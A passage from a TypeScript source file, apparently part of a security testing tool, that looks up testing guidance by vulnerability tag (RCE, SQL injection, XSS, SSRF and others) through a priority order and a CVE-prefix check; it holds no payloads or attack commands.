    relatedTags: ['rce', 'xss', 'xxe'],
  },
};

/**
 * Lookup testing guidance based on finding tags
 * Returns the first matching guidance or null
 */
export function getTestingGuidance(tags: string[]): TestingGuidance | null {
  // Normalize tags to lowercase
  const normalizedTags = tags.map(t => t.toLowerCase());

  // Priority order for matching
  const priorityTags = ['rce', 'sqli', 'xss', 'ssrf', 'lfi', 'xxe', 'ssti', 'idor', 'auth-bypass', 'csrf'];

  // First check priority tags
  for (const priorityTag of priorityTags) {
    if (normalizedTags.includes(priorityTag)) {
      return testingGuidanceByTag[priorityTag] || null;
    }
  }

  // Then check all other tags
  for (const tag of normalizedTags) {
    const guidance = testingGuidanceByTag[tag];
    if (guidance) return guidance;
  }

  // Check for CVE pattern
  if (normalizedTags.some(t => t.startsWith('cve-'))) {
    return testingGuidanceByTag['cve'] || null;
  }

  return null;
}

/**
 * Get all available guidance categories
 */
export function getAvailableGuidanceCategories(): string[] {
  return Object.keys(testingGuidanceByTag);
}
